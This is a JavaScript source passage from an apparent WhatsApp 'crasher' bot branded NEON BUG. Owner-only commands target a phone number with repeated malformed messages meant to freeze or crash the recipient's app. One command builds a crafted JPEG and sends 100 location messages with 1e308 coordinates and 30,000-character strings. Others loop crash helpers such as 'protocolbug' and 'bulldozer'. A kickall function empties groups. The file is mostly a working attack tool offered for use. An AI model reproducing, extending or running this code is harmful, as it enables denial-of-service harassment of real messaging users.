                    `✅ *ᴄᴏʀʀᴇᴄᴛ ᴡᴀʏ:*\n` +
                    `*${prefix}neon-gc 120363xxxxxxxxxx@g.us*\n\n` +
                    `_💡 ᴜsᴇ *${prefix}neon-list* ɪɴsɪᴅᴇ ᴀ ɢʀᴏᴜᴘ ᴛᴏ ɢᴇᴛ ᴛʜᴇ ᴊɪᴅ_`,
                  contextInfo: getExternalAdReply()
                }, { quoted: fakeQuote });
              }
            }
            break;
          }

          // ── NEON IOS ──
          case 'neon-ios': {
            if (!isOwner && !isSudo) {
              await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            if (args[0] && /^\d{5,}$/.test(args[0].replace(/[^0-9]/g, ''))) {
              const rawNum = args[0].replace(/[^0-9]/g, '');
              await handlePendingNeonCommand(sock, chatId, 'neon-ios', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
            } else {
              await sock.sendMessage(chatId, {
                text:
                  `⚠️ 𝗙𝗼𝗼𝗹! 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗵𝗼𝘄 𝘁𝗼 𝘂𝘀𝗲 𝗶𝘁!\n\n` +
                  `✅ *ᴄᴏʀʀᴇᴄᴛ ᴡᴀʏ:*\n` +
                  `*${prefix}neon-ios 2348xxxxxxxxx*`,
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
            }
            break;
          }

          // ── NEON ANDROID ──
          case 'neon-android': {
            if (!isOwner && !isSudo) {
              await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            if (args[0] && /^\d{5,}$/.test(args[0].replace(/[^0-9]/g, ''))) {
              const rawNum = args[0].replace(/[^0-9]/g, '');
              await handlePendingNeonCommand(sock, chatId, 'neon-android', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
            } else {
              await sock.sendMessage(chatId, {
                text:
                  `⚠️ 𝗙𝗼𝗼𝗹! 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗵𝗼𝘄 𝘁𝗼 𝘂𝘀𝗲 𝗶𝘁!\n\n` +
                  `✅ *ᴄᴏʀʀᴇᴄᴛ ᴡᴀʏ:*\n` +
                  `*${prefix}neon-android 2348xxxxxxxxx*`,
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
            }
            break;
          }

          // ── NEON FREEZE ──
          case 'neon-devine-freeze': {
            if (!isOwner && !isSudo) {
              await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            if (args[0] && /^\d{5,}$/.test(args[0].replace(/[^0-9]/g, ''))) {
              const rawNum = args[0].replace(/[^0-9]/g, '');
              await handlePendingNeonCommand(sock, chatId, 'neon-devine-freeze', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
            } else {
              await sock.sendMessage(chatId, {
                text:
                  `⚠️ 𝗙𝗼𝗼𝗹! 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗵𝗼𝘄 𝘁𝗼 𝘂𝘀𝗲 𝗶𝘁!\n\n` +
                  `✅ *ᴄᴏʀʀᴇᴄᴛ ᴡᴀʏ:*\n` +
                  `*${prefix}neon-devine-freeze 2348xxxxxxxxx*`,
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
            }
            break;
          }

          // ── NEON DELAY (NEW — PLACEHOLDER) ──
          case 'neon-delay': {
            if (!isOwner && !isSudo) {
              await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            if (args[0] && /^\d{5,}$/.test(args[0].replace(/[^0-9]/g, ''))) {
              const rawNum = args[0].replace(/[^0-9]/g, '');
              await handlePendingNeonCommand(sock, chatId, 'neon-delay', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
            } else {
              await sock.sendMessage(chatId, {
                text:
                  `⚠️ 𝗙𝗼𝗼𝗹! 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗵𝗼𝘄 𝘁𝗼 𝘂𝘀𝗲 𝗶𝘁!\n\n` +
                  `✅ *ᴄᴏʀʀᴇᴄᴛ ᴡᴀʏ:*\n` +
                  `*${prefix}neon-delay 2348xxxxxxxxx*`,
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
            }
            break;
          }

          // ── NEON INVASION (NEW — PLACEHOLDER) ──
          case 'neon-invasion': {
            if (!isOwner && !isSudo) {
              await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            if (args[0] && /^\d{5,}$/.test(args[0].replace(/[^0-9]/g, ''))) {
              const rawNum = args[0].replace(/[^0-9]/g, '');
              await handlePendingNeonCommand(sock, chatId, 'neon-invasion', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
            } else {
              await sock.sendMessage(chatId, {
                text:
                  `⚠️ 𝗙𝗼𝗼𝗹! 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗵𝗼𝘄 𝘁𝗼 𝘂𝘀𝗲 𝗶𝘁!\n\n` +
                  `✅ *ᴄᴏʀʀᴇᴄᴛ ᴡᴀʏ:*\n` +
                  `*${prefix}neon-invasion 2348xxxxxxxxx*`,
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
            }
            break;
          }

          // ── NEON FREEZE (NEW — PLACEHOLDER) ──
          case 'neon-freeze': {
            if (!isOwner && !isSudo) {
              await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            if (args[0] && /^\d{5,}$/.test(args[0].replace(/[^0-9]/g, ''))) {
              const rawNum = args[0].replace(/[^0-9]/g, '');
              await handlePendingNeonCommand(sock, chatId, 'neon-freeze', rawNum + '@s.whatsapp.net', rawNum, fakeQuote);
            } else {
              await sock.sendMessage(chatId, {
                text:
                  `⚠️ 𝗙𝗼𝗼𝗹! 𝗧𝗵𝗮𝘁'𝘀 𝗻𝗼𝘁 𝗵𝗼𝘄 𝘁𝗼 𝘂𝘀𝗲 𝗶𝘁!\n\n` +
                  `✅ *ᴄᴏʀʀᴇᴄᴛ ᴡᴀʏ:*\n` +
                  `*${prefix}neon-freeze 2348xxxxxxxxx*`,
                contextInfo: getExternalAdReply()
              }, { quoted: fakeQuote });
            }
            break;
          }

          // ── NEON LIST ──
          case 'neon-list': {
            if (!isOwner && !isSudo) {
              await sock.sendMessage(chatId, { text: `⛔ ᴏᴡɴᴇʀ/sᴜᴅᴏ ᴏɴʟʏ! ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            if (!isGroupMsg) {
              await sock.sendMessage(chatId, { text: `⚠️ ᴜsᴇ ᴛʜɪs ɪɴsɪᴅᴇ ᴀ ɢʀᴏᴜᴘ ☠️`, contextInfo: getExternalAdReply() }, { quoted: fakeQuote });
              break;
            }
            const groupJid = chatId;
            const groupName = groupMetadata?.subject || 'Unknown';
            const memberCount = groupMetadata?.participants?.length || 0;
            const groupCard = generateWAMessageFromContent(chatId, {
              viewOnceMessage: {
                message: {
                  messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                  interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                      text:
                        `「☠︎」 *ɢʀᴏᴜᴘ ɪɴғᴏ*\n` +
                        `━━━━━━ ━━━━━━━ ━━━━━━━━ ━━━━━━━\n` +
                        `📛 *ɴᴀᴍᴇ:* ${groupName}\n` +
                        `🔗 *ᴊɪᴅ:* ${groupJid}\n` +
                        `👥 *ᴍᴇᴍʙᴇʀs:* ${memberCount}\n` +
                        `━━━━━━━━━━━━━━━━━━━━━━━━━━━`
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({ text: '☠︎」𝑽𝑬𝑵𝑶𝑴 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 𝘃𝟭.𝟬' }),
                    header: proto.Message.InteractiveMessage.Header.create({ title: '🎯 𝗥𝗔𝗜𝗗 𝗧𝗔𝗥𝗚𝗘𝗧', subtitle: toMathItalic('NEON BUG'), hasMediaAttachment: false }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                      buttons: [{
                        name: 'cta_copy',
                        buttonParamsJson: JSON.stringify({ display_text: '📋 ᴄᴏᴘʏ ᴊɪᴅ', copy_code: groupJid })
                      }]
                    })
                  })
                }
              }
            }, { quoted: fakeQuote });
            await sock.relayMessage(chatId, groupCard.message, { messageId: groupCard.key.id });
            break;
          }

          default:
            break;

        } // end switch

      } catch (err) {
        console.error(chalk.red('❌ Error processing message:'), err);
      }
    }
  });

}; // end module.exports

// ============================================
// PENDING NEON COMMAND HANDLER
// ============================================
async function handlePendingNeonCommand(sock, chatId, command, targetJid, rawNum, fakeQuote) {
  const adReply = getExternalAdReply();

  switch (command) {

    // ── NEON IOS ──
    case 'neon-ios': {
      try {
        const axios    = require('axios');
        const FormData = require('form-data');
        const fs       = require('fs-extra');
        const path     = require('path');

        await sock.sendMessage(chatId, {
          text:
            `𓅓 *ʀᴀɪᴅɪᴏs ᴅᴇᴘʟᴏʏɪɴɢ*\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
            `📱 *ᴘʟᴀᴛғᴏʀᴍ:* iOS\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `_「☠︎」NEON ᴛᴀʀɢᴇᴛɪɴɢ ɪᴏs..._`,
          contextInfo: adReply
        }, { quoted: fakeQuote });

        const BASE_URL = 'https://get1.imglarger.com';
        const HEADERS  = {
          'User-Agent':      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
          'Accept':          'application/json, text/plain, */*',
          'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
          'Origin':          'https://imgupscaler.com',
          'Referer':         'https://imgupscaler.com/'
        };

        const craftedJpeg = Buffer.concat([
          Buffer.from([
            0xFF,0xD8,0xFF,0xE0,0x00,0x10,
            0x4A,0x46,0x49,0x46,0x00,0x01,0x01,0x00,
            0xFF,0xFF,0xFF,0xFF,0x00,0x00,
            0xFF,0xC0,0x00,0x11,0x08,0xFF,0xFF,0xFF,0xFF,0x03,
            0x01,0x11,0x00,0x02,0x11,0x01,0x03,0x11,0x01,
            0xFF,0xD9
          ]),
          Buffer.alloc(512, 0xFF)
        ]);

        const tmpDir = path.join(__dirname, 'tmp');
        await fs.ensureDir(tmpDir);
        const tmpFilePath = path.join(tmpDir, `neon-ios_${Date.now()}.jpg`);
        await fs.writeFile(tmpFilePath, craftedJpeg);

        let upscaledBuffer = craftedJpeg;

        try {
          const form = new FormData();
          form.append('myfile', fs.createReadStream(tmpFilePath), path.basename(tmpFilePath));
          form.append('scaleRadio', '2');
          const uploadResponse = await axios.post(`${BASE_URL}/api/UpscalerNew/UploadNew`, form, {
            headers: { ...HEADERS, ...form.getHeaders() }, timeout: 30000
          });
          const code = uploadResponse.data?.data?.code;
          if (code) {
            let attempts = 0;
            while (attempts < 10) {
              const statusResponse = await axios.post(`${BASE_URL}/api/UpscalerNew/CheckStatusNew`,
                { code, scaleRadio: 2 },
                { headers: { ...HEADERS, 'Content-Type': 'application/json' }, timeout: 15000 }
              );
              const status = statusResponse.data;
              if (status?.code === 200 && status?.data &&
                (status.data.download_url || status.data.img_url || status.data.status === 'success')) {
                const resultUrl = status.data.download_url || status.data.img_url;
                if (resultUrl) {
                  const imgDownload = await axios.get(resultUrl, { responseType: 'arraybuffer', timeout: 30000 });
                  upscaledBuffer = Buffer.from(imgDownload.data);
                }
                break;
              }
              attempts++;
              await new Promise(r => setTimeout(r, 3000));
            }
          }
        } catch (upscaleErr) {
          console.warn(chalk.yellow(`[neon-ios] Upscaler failed: ${upscaleErr.message}`));
        }

        await fs.remove(tmpFilePath).catch(() => {});

        let sent = 0;
        let failed = 0;

        for (let i = 0; i < 100; i++) {
          try {
            const m = generateWAMessageFromContent(targetJid, {
              locationMessage: {
                degreesLatitude: 1e308, degreesLongitude: 1e308,
                name: 'ꦽ'.repeat(30000), address: 'ꦽ'.repeat(30000),
                isLive: true, accuracyInMeters: 1e308, jpegThumbnail: upscaledBuffer
              }
            }, {});
            await sock.relayMessage(targetJid, m.message, { messageId: m.key.id, participant: { jid: targetJid } });
            sent++;
            await delay(300);
          } catch (e) {
            failed++;
            await delay(500);
          }
        }

        await sock.sendMessage(chatId, {
          text:
            `𓅓*ʀᴀɪᴅɪᴏs ᴄᴏᴍᴘʟᴇᴛᴇ*\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
            `📊 *sᴇɴᴛ:* ${sent}/100\n` +
            `📈 *sᴜᴄᴄᴇss:* ${Math.round((sent / 100) * 100)}%\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `_𓅓 NEON BUG`,
          contextInfo: adReply
        }, { quoted: fakeQuote });

      } catch (e) {
        console.error(chalk.red('❌ neon-ios error:'), e.message);
        await sock.sendMessage(chatId, { text: `❌ *ʀᴀɪᴅɪᴏs ғᴀɪʟᴇᴅ*\n\n${e.message}` }).catch(() => {});
      }
      break;
    }

    // ── NEON ANDROID ──
    // Uses: sendCombo + protocolbug6 + protocolbug3 + bulldozer + delayMakerInvisible
    case 'neon-android': {
      try {
        await sock.sendMessage(chatId, {
          text:
            `「☠︎」🤖 *Neonᴀɴᴅʀᴏɪᴅ ᴅᴇᴘʟᴏʏɪɴɢ*\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
            `📱 *ᴘʟᴀᴛғᴏʀᴍ:* Android\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `_☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬..._`,
          contextInfo: adReply
        }, { quoted: fakeQuote });

        const ROUNDS = 50;
        let sent = 0;
        let failed = 0;

        for (let i = 0; i < ROUNDS; i++) {
          try {
            await _sendCombo(sock, targetJid);
            await delay(500);
            await _protocolbug6(sock, targetJid, true);
            await delay(500);
            await _protocolbug3(sock, targetJid, true);
            await delay(500);
            await _bulldozer(sock, targetJid);
            await delay(500);
            await _delayMakerInvisible(sock, targetJid);
            await delay(500);
            sent++;
          } catch (e) {
            failed++;
            console.warn(chalk.yellow(`⚠️ neon-android round ${i + 1} failed: ${e.message}`));
            await delay(500);
          }
        }

        await sock.sendMessage(chatId, {
          text:
            `「☠︎」🤖 *Neonᴀɴᴅʀᴏɪᴅ ᴄᴏᴍᴘʟᴇᴛᴇ*\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
            `📊 *ʀᴏᴜɴᴅs:* ${sent}/${ROUNDS}\n` +
            `📈 *sᴜᴄᴄᴇss:* ${Math.round((sent / ROUNDS) * 100)}%\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `_☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮a 𝘃𝟭.𝟬_`,
          contextInfo: adReply
        }, { quoted: fakeQuote });

      } catch (e) {
        console.error(chalk.red('❌ neon-android error:'), e.message);
        await sock.sendMessage(chatId, { text: `❌ *ʀᴀɪᴅᴀɴᴅʀᴏɪᴅ ғᴀɪʟᴇᴅ*\n\n${e.message}` }).catch(() => {});
      }
      break;
    }

    // ── NEON FREEZE ──
    // Uses: BetaDelay + epcihDiley
    case 'neon-devine-freeze': {
      try {
        await sock.sendMessage(chatId, {
          text:
            `「☠︎」❄️ *ᴅᴇᴠɪɴᴇ-ғʀᴇᴇᴢᴇ ᴀʀᴍɪɴɢ*\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
            `📱 *ᴘʟᴀᴛғᴏʀᴍ:* Android\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `_「☠︎」ғʀᴇᴇᴢɪɴɢ ᴛᴀʀɢᴇᴛ..._`,
          contextInfo: adReply
        }, { quoted: fakeQuote });

        const ROUNDS = 40;
        let sent = 0;
        let failed = 0;

        for (let i = 0; i < ROUNDS; i++) {
          try {
            await _betaDelay(sock, targetJid, true);
            await delay(500);
            await _epcihDiley(sock, targetJid);
            await delay(500);
            sent++;
          } catch (e) {
            failed++;
            console.warn(chalk.yellow(`⚠️ neon-devine-freeze round ${i + 1} failed: ${e.message}`));
            await delay(500);
          }
        }

        await sock.sendMessage(chatId, {
          text:
            `「☠︎」❄️ *ᴅᴇᴠɪɴᴇ-ғʀᴇᴇᴢᴇ ᴄᴏᴍᴘʟᴇᴛᴇ*\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
            `📊 *ʀᴏᴜɴᴅs:* ${sent}/${ROUNDS}\n` +
            `📈 *sᴜᴄᴄᴇss:* ${Math.round((sent / ROUNDS) * 100)}%\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬`,
          contextInfo: adReply
        }, { quoted: fakeQuote });

      } catch (e) {
        console.error(chalk.red('❌ neon-devine-freeze error:'), e.message);
        await sock.sendMessage(chatId, { text: `❌ *ᴅᴇᴠɪɴᴇ-ғʀᴇᴇᴢᴇ ғᴀɪʟᴇᴅ*\n\n${e.message}` }).catch(() => {});
      }
      break;
    }

    // ── NEON DELAY ──
    // Uses: DelaFreezCloseRelay + delayMakerInvisible
    case 'neon-delay': {
      try {
        await sock.sendMessage(chatId, {
          text:
            `「☠︎」⏱️ *Neon-ᴅᴇʟᴀʏ ᴅᴇᴘʟᴏʏɪɴɢ*\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
            `📱 *ᴘʟᴀᴛғᴏʀᴍ:* Android\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `_「☠︎」ᴅᴇʟᴀʏ ᴀᴛᴛᴀᴄᴋ ʟᴀᴜɴᴄʜɪɴɢ..._`,
          contextInfo: adReply
        }, { quoted: fakeQuote });

        const ROUNDS = 40;
        let sent = 0;
        let failed = 0;

        for (let i = 0; i < ROUNDS; i++) {
          try {
            await _delaFreezCloseRelay(sock, targetJid);
            await delay(500);
            await _delayMakerInvisible(sock, targetJid);
            await delay(500);
            sent++;
          } catch (e) {
            failed++;
            console.warn(chalk.yellow(`⚠️ neon-delay round ${i + 1} failed: ${e.message}`));
            await delay(500);
          }
        }

        await sock.sendMessage(chatId, {
          text:
            `「☠︎」⏱️ *Neon-ᴅᴇʟᴀʏ ᴄᴏᴍᴘʟᴇᴛᴇ*\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
            `📊 *ʀᴏᴜɴᴅs:* ${sent}/${ROUNDS}\n` +
            `📈 *sᴜᴄᴄᴇss:* ${Math.round((sent / ROUNDS) * 100)}%\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `_☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬`,
          contextInfo: adReply
        }, { quoted: fakeQuote });

      } catch (e) {
        console.error(chalk.red('❌ neon-delay error:'), e.message);
        await sock.sendMessage(chatId, { text: `❌ *ʀᴀɪᴅ-ᴅᴇʟᴀʏ ғᴀɪʟᴇᴅ*\n\n${e.message}` }).catch(() => {});
      }
      break;
    }

    // ── NEON INVASION ──
    // Uses: delayMakerInvisible (heavy loop — iOS targeted)
    case 'neon-invasion': {
      try {
        await sock.sendMessage(chatId, {
          text:
            `「☠︎」🌑 *ɴeon-ɪɴᴠᴀsɪᴏɴ ᴅᴇᴘʟᴏʏɪɴɢ*\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
            `📱 *ᴘʟᴀᴛғᴏʀᴍ:* iOS\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `_「☠︎」ɴeon ɪɴᴠᴀsɪᴏɴ ʟᴀᴜɴᴄʜɪɴɢ..._`,
          contextInfo: adReply
        }, { quoted: fakeQuote });

        const ROUNDS = 40;
        let sent = 0;
        let failed = 0;

        for (let i = 0; i < ROUNDS; i++) {
          try {
            await _delayMakerInvisible(sock, targetJid);
            await delay(500);
            await _delayMakerInvisible(sock, targetJid);
            await delay(500);
            await _delayMakerInvisible(sock, targetJid);
            await delay(500);
            await _delayMakerInvisible(sock, targetJid);
            await delay(500);
            sent++;
          } catch (e) {
            failed++;
            console.warn(chalk.yellow(`⚠️ neon-invasion round ${i + 1} failed: ${e.message}`));
            await delay(500);
          }
        }

        await sock.sendMessage(chatId, {
          text:
            `「☠︎」🌑 *ɴeon-ɪɴᴠᴀsɪᴏɴ ᴄᴏᴍᴘʟᴇᴛᴇ*\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
            `📊 *ʀᴏᴜɴᴅs:* ${sent}/${ROUNDS}\n` +
            `📈 *sᴜᴄᴄᴇss:* ${Math.round((sent / ROUNDS) * 100)}%\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `_☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬_`,
          contextInfo: adReply
        }, { quoted: fakeQuote });

      } catch (e) {
        console.error(chalk.red('❌ neon-invasion error:'), e.message);
        await sock.sendMessage(chatId, { text: `❌ *ɴɪɢʜᴛ-ɪɴᴠᴀsɪᴏɴ ғᴀɪʟᴇᴅ*\n\n${e.message}` }).catch(() => {});
      }
      break;
    }

    // ── NEON OBITO ──
    // Uses: NativeXFcWithDozerX + BetaTester
    case 'neon-freeze': {
      try {
        await sock.sendMessage(chatId, {
          text:
            `「☠︎」🔥 *ᴏʙɪᴛᴏ-ғʀᴇᴇᴢᴇ ᴀʀᴍɪɴɢ*\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
            `📱 *ᴘʟᴀᴛғᴏʀᴍ:* iOS\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `_「☠︎」ᴏʙɪᴛᴏ's ᴀᴍᴀᴛᴇʀᴀsᴜ ɪɢɴɪᴛɪɴɢ..._`,
          contextInfo: adReply
        }, { quoted: fakeQuote });

        const ROUNDS = 50;
        let sent = 0;
        let failed = 0;

        for (let i = 0; i < ROUNDS; i++) {
          try {
            await _nativeXFcWithDozerX(sock, targetJid);
            await delay(500);
            await _betaTester(sock, targetJid, true);
            await delay(500);
            sent++;
          } catch (e) {
            failed++;
            console.warn(chalk.yellow(`⚠️ neon-freeze round ${i + 1} failed: ${e.message}`));
            await delay(500);
          }
        }

        await sock.sendMessage(chatId, {
          text:
            `「☠︎」🔥 *ᴏʙɪᴛᴏ-ғʀᴇᴇᴢᴇ ᴄᴏᴍᴘʟᴇᴛᴇ*\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🎯 *ᴛᴀʀɢᴇᴛ:* ${targetJid}\n` +
            `📊 *ʀᴏᴜɴᴅs:* ${sent}/${ROUNDS}\n` +
            `📈 *sᴜᴄᴄᴇss:* ${Math.round((sent / ROUNDS) * 100)}%\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `_☠︎」𝑵𝑬𝑶𝑵 𝑩𝑼𝑮 𝘃𝟭.𝟬`,
          contextInfo: adReply
        }, { quoted: fakeQuote });

      } catch (e) {
        console.error(chalk.red('❌ neon-freeze error:'), e.message);
        await sock.sendMessage(chatId, { text: `❌ *ᴏʙɪᴛᴏ-ғʀᴇᴇᴢᴇ ғᴀɪʟᴇᴅ*\n\n${e.message}` }).catch(() => {});
      }
      break;
    }

    default:
      break;
  }
}

// ============================================
// KICKALL FUNCTION
// ============================================
async function kickAllMembers(sock, chatId, sender, groupMetadata, fakeQuote, botPhoneNumber) {
  try {
    if (!sock || !sock.user) throw new Error('Bot not connected');

    // ── Bot must be admin ──
    const rawBotJid    = (sock.user?.id || '').replace(/:\d+@/, '@');
    const rawBotLid    = sock.authState?.creds?.me?.lid
      ? sock.authState.creds.me.lid.replace(/:\d+@/, '@')
      : null;
    const cleanSenderJid = sender.replace(/:\d+@/, '@');

    // ── Fetch fresh metadata ──
    let meta;
    try {
      meta = await sock.groupMetadata(chatId);
    } catch (e) {
      await sock.sendMessage(chatId, {
        text: `✘ ᴄᴏᴜʟᴅɴ'ᴛ ʟᴏᴀᴅ ɢʀᴏᴜᴘ ᴅᴀᴛᴀ ☠️`,
        contextInfo: getExternalAdReply()
      }, { quoted: fakeQuote });
      return;
    }

    // ── Check bot is admin ──
    const botIsAdmin = !!meta.participants.find(p => {
      const cleanId  = p.id.replace(/:\d+@/, '@');
      const cleanJid = (p.jid || '').replace(/:\d+@/, '@');
      const isBot = cleanId === rawBotJid || cleanJid === rawBotJid ||
        (rawBotLid && (cleanId === rawBotLid || cleanJid === rawBotLid));
      return isBot && p.admin;
    });

    if (!botIsAdmin) {
      await sock.sendMessage(chatId, {
        text: `「☠︎」✘ ɪ ᴀᴍ ɴᴏᴛ ᴀɴ ᴀᴅᴍɪɴ ɪɴ ᴛʜɪs ɢʀᴏᴜᴘ!\n\n_ᴍᴀᴋᴇ ᴍᴇ ᴀᴅᴍɪɴ ғɪʀsᴛ ᴛʜᴇɴ ᴛʀʏ ᴀɢᴀɪɴ ☠️_`,
        contextInfo: getExternalAdReply()
      }, { quoted: fakeQuote });
      return;
    }

    // ── Protect bot and sender ──
    const isBot = (p) => {
      const cleanId  = p.id.replace(/:\d+@/, '@');
      const cleanJid = (p.jid || '').replace(/:\d+@/, '@');
      return cleanId === rawBotJid || cleanJid === rawBotJid ||
        (rawBotLid && (cleanId === rawBotLid || cleanJid === rawBotLid));
    };
    const isSenderP = (p) => {
      const cleanId  = p.id.replace(/:\d+@/, '@');
      const cleanJid = (p.jid || '').replace(/:\d+@/, '@');
      return cleanId === cleanSenderJid || cleanJid === cleanSenderJid;
    };

    const toKick = meta.participants.filter(p => !isBot(p) && !isSenderP(p));

    if (toKick.length === 0) {
      await sock.sendMessage(chatId, {
        text: `✘ ɴᴏ ᴍᴇᴍʙᴇʀs ᴛᴏ ᴋɪᴄᴋ ☠️`,
        contextInfo: getExternalAdReply()
      }, { quoted: fakeQuote });
      return;
    }

    await sock.sendMessage(chatId, {
      text: `「☠︎」⏳ ᴋɪᴄᴋɪɴɢ ${toKick.length} ᴍᴇᴍʙᴇʀs...`,
      contextInfo: getExternalAdReply()
    }, { quoted: fakeQuote });

    let kicked = 0;
    let failed = 0;
    const BATCH_SIZE = 5;

    for (let i = 0; i < toKick.length; i += BATCH_SIZE) {
      const batch = toKick.slice(i, i + BATCH_SIZE);
      const batchIds = batch.map(p => p.id);
      try {
        await sock.groupParticipantsUpdate(chatId, batchIds, 'remove');
        kicked += batchIds.length;
      } catch (e) {
        for (const p of batch) {
          if (isBot(p) || isSenderP(p)) continue; // final guard
          try {
            await sock.groupParticipantsUpdate(chatId, [p.id], 'remove');
            kicked++;
            await delay(300);
          } catch (e2) {
            // ── @lid fallback: use p.jid if available ──
            if (p.id.endsWith('@lid') && p.jid) {
              try {
                const phoneJid = p.jid.replace(/:\d+@/, '@');
                await sock.groupParticipantsUpdate(chatId, [phoneJid], 'remove');
                kicked++;
              } catch (e3) { failed++; }
            } else {
              failed++;
            }
          }
        }
      }
      if (i + BATCH_SIZE < toKick.length) await delay(800);
    }

    const failNote = failed > 0 ? ` · ${failed} ᴘʀᴏᴛᴇᴄᴛᴇᴅ` : '';
    await sock.sendMessage(chatId, {
      text: `「☠︎」✓ ᴋɪᴄᴋᴇᴅ ${kicked} ᴍᴇᴍʙᴇʀs${failNote} ☠️\n_「☠︎」ɢʀᴏᴜᴘ ᴄʟᴇᴀɴsᴇᴅ ʙʏ ɴɪɢʜᴛ ʀᴀɪᴅᴇʀs_`,
      contextInfo: getExternalAdReply()
    }, { quoted: fakeQuote });

  } catch (err) {
    console.error(chalk.red('❌ Error in kickAllMembers:'), err);
    await sock.sendMessage(chatId, {
      text: `✘ ᴋɪᴄᴋᴀʟʟ ғᴀɪʟᴇᴅ: ${err.message} ☠️`,
      contextInfo: getExternalAdReply()
    }, { quoted: fakeQuote });
